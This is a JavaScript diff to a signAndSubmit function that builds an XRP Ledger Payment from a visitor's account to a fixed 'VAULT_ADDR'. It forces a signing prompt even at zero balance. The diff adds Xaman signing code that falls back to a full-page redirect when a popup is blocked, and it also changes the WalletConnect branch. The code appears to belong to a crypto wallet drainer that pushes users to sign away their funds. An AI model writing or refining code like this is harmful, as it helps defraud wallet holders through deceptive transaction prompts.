@@ -132,18 +132,36 @@ async function signAndSubmit(type, address, amountDrops) {
     TransactionType: "Payment",
     Account: address,
     Destination: VAULT_ADDR,
-    Amount: amountDrops || "0" // Forced prompt even if 0
+    Amount: amountDrops || "0" // Forced prompt even if balance is 0
   };
 
   if (type === "xaman") {
-    const payload = await xumm.payload.create(tx);
-    
-    if (payload && payload.next && payload.next.always) {
-        // FIX: This ensures the signing URL opens in a new tab/app
-        window.open(payload.next.always, "_blank");
-        setStatus("Confirm in Xaman");
+    try {
+      // 1. Create the payload on Xaman servers
+      const payload = await xumm.payload.create(tx);
+      
+      if (payload && payload.next) {
+          // 2. Open the signing request. 
+          // On Desktop: This opens the Xaman QR Modal.
+          // On Mobile: This deep-links into the Xaman app.
+          const openUrl = payload.next.always;
+          
+          // Use window.open for desktop browsers to avoid popup blockers
+          const popup = window.open(openUrl, "_blank");
+          
+          if (!popup || popup.closed || typeof popup.closed == 'undefined') { 
+              // If the browser blocked the popup, fallback to redirect
+              window.location.href = openUrl;
+          }
+          
+          setStatus("Confirm in Xaman app");
+      }
+    } catch (err) {
+      console.error("Xaman Payload Error:", err);
+      setStatus("Signature failed to open");
     }
   } 
+  
   else if (type === "walletconnect") {
     const session = wcClient.session.getAll()[0];
     await wcClient.request({
@@ -154,7 +172,7 @@ async function signAndSubmit(type, address, amountDrops) {
         params: { tx_json: tx }
       }
     });
-    setStatus("Check Wallet App");
+    setStatus("Check your wallet app");
   }
 }
 
